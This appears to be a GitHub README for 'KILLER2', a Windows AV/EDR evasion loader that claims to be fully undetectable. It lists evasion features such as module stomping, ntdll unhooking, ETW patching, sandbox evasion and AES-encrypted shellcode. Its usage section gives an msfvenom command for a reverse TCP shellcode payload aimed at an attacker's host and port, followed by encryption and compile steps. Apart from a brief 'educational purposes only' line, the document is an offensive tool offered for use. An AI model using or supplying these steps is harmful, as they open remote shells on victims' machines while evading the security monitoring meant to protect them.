# KILLER2 TOOL (EDR Evasion)
It's a AV/EDR Evasion tool created to bypass security tools for learning, until now the tool is FUD.

# Features:

* Module Stomping for Memory scanning evasion
* DLL Unhooking by fresh ntdll copy
* IAT Hiding and Obfuscation & API Unhooking
* ETW Patchnig for bypassing some security controls
* Included sandbox evasion techniques & Basic Anti-Debugging
* Fully obfuscated (Functions - Keys - Shellcode) by AES
* Shellcode reversed and Encrypted
* Moving payload into hallowed memory without using APIs 
* GetProcAddress & GetModuleHandle Implementation by @cocomelonc
* Runs without creating new thread & Suppoers x64 and x86 arch

# How to use it

Generate your shellcode with msfvenom tool :

 * msfvenom -p windows/x64/custom/reverse_tcp LHOST<IP> LPORT<PORT> -f raw -o payload.bin

* py3 encryptor.py — python3 encryptor.py payload.bin

* py3 reverse_shellcode.py --header payload.h

* cl /EHsc killer_aes.cpp Shlwapi.lib psapi.lib

* x86_64-w64-mingw32-g++ -O2 -static -s -fpermissive -o killer.exe killer_aes.cpp -lshlwapi -lpsapi





# Important Notes

* First thanks to [Abdallah Mohammed](https://github.com/abdallah-elsharif) for helping me to develop it. 
* Second, I just altered it!
* The tool is for educational purposes only

